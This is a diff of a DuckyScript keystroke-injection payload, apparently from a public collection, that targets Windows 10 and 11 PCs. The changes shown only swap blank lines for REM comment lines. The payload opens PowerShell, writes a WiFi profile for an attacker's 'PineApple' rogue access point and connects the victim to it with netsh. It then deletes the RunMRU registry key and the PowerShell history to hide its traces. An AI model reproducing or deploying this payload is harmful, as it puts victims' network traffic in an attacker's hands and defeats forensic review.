@@ -1,22 +1,21 @@
-
 REM     Title: PineApple
 REM     Description: This payload is meant to use powershell to add the network profile of your wifi pineapple to the targets PC and connect to it
 REM     This version is a direct key stroke injection attack
 REM     Author: I am Jakoby
 REM     Target: Windows 10, 11
-
+REM
 DELAY 1000
-
+REM
 REM     If the wifi pineapple SSID is detected target PC will connect to it  
-
+REM
 GUI r 
 DELAY 500
 STRING powershell
 DELAY 500
 ENTER
-
+REM
 DELAY 1000
-
+REM
 STRING $profilefile="Home.xml";
 SHIFT ENTER
 STRING $SSID="PineApple";
@@ -75,6 +74,6 @@ SHIFT ENTER
 STRING netsh wlan connect name=$SSID
 SHIFT ENTER
 STRING reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f; Remove-Item (Get-PSreadlineOption).HistorySavePath
-
+REM
 DELAY 500
 ENTER
